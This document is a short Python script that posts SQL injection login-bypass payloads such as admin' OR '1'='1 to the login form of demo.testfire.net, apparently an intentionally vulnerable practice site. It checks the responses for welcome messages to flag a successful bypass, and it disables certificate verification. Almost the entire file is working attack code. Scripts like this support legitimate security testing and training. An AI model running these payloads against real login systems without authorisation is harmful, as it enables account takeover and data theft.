import asyncio
import httpx
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings()

async def test_login_sqli():
    url = 'https://demo.testfire.net/doLogin'
    
    async with httpx.AsyncClient(timeout=30, verify=False, follow_redirects=True) as client:
        r1 = await client.post(url, data={'uid': 'admin', 'passw': 'test', 'btnSubmit': 'Login'})
        soup1 = BeautifulSoup(r1.text, 'html.parser')
        print(f"Original login attempt:")
        print(f"  Status: {r1.status_code}")
        
        welcome1 = soup1.find(text=lambda t: t and 'Welcome' in t)
        error1 = soup1.find(text=lambda t: t and ('Invalid' in t or 'error' in t.lower()))
        print(f"  Welcome msg: {welcome1}")
        print(f"  Error msg: {error1}")
        
        tests = [
            ("admin' OR '1'='1", {'uid': "admin' OR '1'='1", 'passw': 'test', 'btnSubmit': 'Login'}),
            ("' OR '1'='1' --", {'uid': "' OR '1'='1' --", 'passw': 'x', 'btnSubmit': 'Login'}),
        ]
        
        for name, data in tests:
            r2 = await client.post(url, data=data)
            soup2 = BeautifulSoup(r2.text, 'html.parser')
            
            welcome2 = soup2.find(text=lambda t: t and 'Welcome' in t)
            error2 = soup2.find(text=lambda t: t and ('Invalid' in t or 'error' in t.lower()))
            account_link = soup2.find('a', href=lambda h: h and 'account' in h.lower())
            
            print(f"\n{name}:")
            print(f"  Status: {r2.status_code}")
            print(f"  Welcome msg: {welcome2}")
            print(f"  Error msg: {error2}")
            print(f"  Account link: {account_link}")
            
            if welcome2 and not error2:
                print(f"  *** VULNERABLE: May be logged in! ***")

if __name__ == "__main__":
    asyncio.run(test_login_sqli())